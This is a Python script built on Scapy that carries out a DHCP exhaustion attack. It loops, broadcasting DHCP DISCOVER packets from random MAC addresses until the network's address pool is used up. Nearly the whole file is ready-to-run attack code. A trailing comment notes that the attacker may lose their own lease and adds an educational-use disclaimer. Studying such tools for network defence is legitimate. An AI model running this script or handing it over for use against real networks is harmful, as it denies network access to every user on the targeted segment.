from scapy.all import *
import random
import time

def random_mac():
    """Generate a random MAC address (Locally Administered Address - LAA)"""
    mac = [ 0x02, 0x00, 0x00,
            random.randint(0x00, 0x7f),
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def send_dhcp_discover(interface):
    """Send a DHCP Discover packet with a random MAC address"""
    mac = random_mac()
    print(f"[+] Sending DHCP DISCOVER with MAC: {mac}")

    ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=mac, type=0x0800)
    ip = IP(src='0.0.0.0', dst='255.255.255.255')
    udp = UDP(sport=68, dport=67)

    bootp = BOOTP(chaddr=mac2str(mac), xid=random.randint(1, 900000000), flags=0x8000)
    dhcp = DHCP(options=[('message-type', 'discover'), ('end')])

    packet = ethernet / ip / udp / bootp / dhcp

    sendp(packet, iface=interface, verbose=0)

def mac2str(mac):
    """Convert MAC address (string) to bytes"""
    return bytes.fromhex(mac.replace(':', '')) + b'\x00' * 10

if __name__ == "__main__":
    interface = input("Enter the network interface (e.g., eth0, wlan0): ").strip()

    print("\n[+] Starting DHCP Exhaustion attack (Press CTRL+C to stop)...\n")

    try:
        while True:
            send_dhcp_discover(interface)
            time.sleep(0.5)  # Adjust delay (0.5 sec between packets)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")


# NOTE:
# After performing a DHCP exhaustion attack, all available IP addresses in the DHCP pool may be consumed.
# If you release your own IP address using:
#     sudo dhclient -r
# and then try to obtain a new IP address again with:
#     sudo dhclient
# you may NOT be able to get an IP address because the pool is exhausted.
# Be careful when running this tool in a live network. 
# Cybersecurity, Penetration testing and ethical hacking tools - to be used for educational purposes ONLY. 
# DISCLAIMER: Performing hacking attempts on computers that you do not own (without permission) is illegal!
